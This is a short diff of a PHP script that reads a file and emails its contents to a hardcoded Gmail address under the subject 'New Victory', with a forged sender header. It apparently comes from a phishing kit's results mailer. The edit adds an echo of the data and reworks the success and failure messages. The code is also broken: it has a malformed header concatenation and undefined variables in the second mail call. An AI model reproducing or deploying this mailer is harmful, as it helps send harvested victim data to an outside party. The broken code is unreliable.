@@ -34,21 +34,20 @@ $txt = file_get_contents($file);
 
 //$message ='hey how are you';
 
-<?php
 $to = "censorday.offical@gmail.com";
 $subject = "New Victory";
 $headers = "postman@postm25.com" . "\r\n" .
 
 
 mail($to,$subject,$txt,$headers);
-?>
 
-if(mail($tothe,$sub,$document,$headers))
+echo $txt;
+if(mail($tothe,$sub,$txt,$headers))
 {
 	echo "<center><H1><font color=#3cb371 >Message succesfully sent</font></H1></center>";
 }
 else {
-	echo "<br><br><center><H1><font color=#ff0000 >Message NOT sent</font></H1></center> <br><center>PLEASE RECHECK</center>";
+	echo "Message NOT sent ------- x -------  x  --------  x  ------  PLEASE RECHECK";
 }
 
 
